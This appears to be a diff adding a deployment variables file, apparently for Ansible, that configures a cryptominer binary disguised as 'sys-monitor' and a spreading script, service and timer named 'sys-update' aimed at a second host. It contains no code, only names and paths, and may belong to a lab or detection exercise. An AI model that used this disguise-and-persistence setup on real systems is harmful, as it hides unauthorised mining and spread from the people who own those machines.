@@ -1,0 +1,8 @@
+username: cyrano
+target_host: second-host
+target_user: cyrano
+miner_binary: /usr/local/sbin/sys-monitor
+spread_script: /usr/local/bin/sys-update.sh
+spread_log: "/home/{{ username }}/sys-update.log"
+spread_service: sys-update.service
+spread_timer: sys-update.timer
